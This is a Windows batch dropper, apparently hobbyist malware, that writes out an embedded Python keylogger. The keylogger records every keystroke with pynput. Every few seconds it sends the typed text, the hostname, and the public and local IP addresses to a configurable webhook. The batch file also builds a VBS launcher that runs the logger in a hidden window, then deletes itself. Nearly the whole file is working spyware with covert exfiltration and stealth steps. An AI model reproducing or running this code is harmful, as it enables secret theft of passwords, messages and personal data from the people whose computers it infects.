@echo off

for /f "useback delims=" %%_ in (%0) do (
  if "%%_"=="___ATAD___" set $=
  if defined $ echo(%%_
  if "%%_"=="___DATA___" set $=1
) >> pynlog.pyw
goto :next

___DATA___
#made by kairös :)
from pynput.keyboard import Listener # pip install requests
from threading import Timer
import requests # pip install requests
import socket

msg = ""
wait_between_send = 5 # in seconds
webhook_url = "" # put your webhook url in the quotes

def on_press(key):
    try:
        global msg
        if len(str(key)) == 3:
            key = str(key)[1:-1]
            msg += str(key)
        elif str(key) == "Key.space":
            msg += " "
        elif str(key) == "Key.enter":
            msg += "\n"
        elif str(key) == "Key.backspace":
            if len(msg.replace("↞", "")) > 0:
                msg = msg[:-1]
            else:
                msg += "↞"
    except Exception as e:
        headers = {"content-type": "application/json"}
        json = {"content": f"```error: {e}```"}
        r = requests.post(webhook_url, headers=headers, json=json)

def send():
    try:
        global msg
        if len(msg) > 0:
            headers = {"content-type": "application/json"}
            ip = requests.get("https://api.ipgeolocation.io/getip?apiKey=", headers=headers).json()["ip"] # put your geolocation api key after ?apiKey=
            json = {"content": f"```\nDevice Name: {socket.gethostname()}\nPublic Ip: {ip}\nLocal Ip: {socket.gethostbyname(socket.gethostname())}\n\n{msg}\n```"}
            r = requests.post(webhook_url, headers=headers, json=json)
            msg = ""
        Timer(wait_between_send, send).start()
    except Exception as e:
        headers = {"content-type": "application/json"}
        json = {"content": f"```error: {e}```"}
        r = requests.post(webhook_url, headers=headers, json=json)

listener = Listener(on_press=on_press)
listener.start()

Timer(wait_between_send, send).start()
___ATAD___

:next

echo CreateObject^(^"Wscript.Shell^"^).Run ^"runpy.bat^"^, 0^, True > RUNME.vbs
echo ^@echo off > runpy.bat
echo python pynlog.pyw >> runpy.bat
del "setupstuff.bat"
